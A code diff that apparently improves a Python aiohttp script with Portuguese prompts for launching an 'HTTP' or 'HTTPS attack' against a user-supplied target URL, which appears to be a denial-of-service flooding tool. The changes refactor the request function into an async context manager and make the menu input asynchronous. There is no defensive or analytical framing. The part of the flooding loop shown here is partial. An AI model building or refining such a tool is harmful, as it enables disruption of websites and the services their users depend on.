@@ -1,11 +1,10 @@
 import aiohttp
 import asyncio
-import threading
-import time
 
 async def send_request(url, session):
     try:
-        await session.get(url)
+        async with session.get(url) as response:
+            pass  # Pode adicionar lógica de processamento da resposta aqui
     except Exception as e:
         print(f"Erro ao enviar solicitação: {e}")
 
@@ -22,7 +21,7 @@ async def main():
     print("Selecione o tipo de ataque:")
     print("1. Ataque HTTP")
     print("2. Ataque HTTPS")
-    choice = int(input("Digite o número da sua escolha: "))
+    choice = await asyncio.to_thread(lambda: int(input("Digite o número da sua escolha: ")))
 
     if choice == 1:
         url = input("Insira o URL alvo: ")
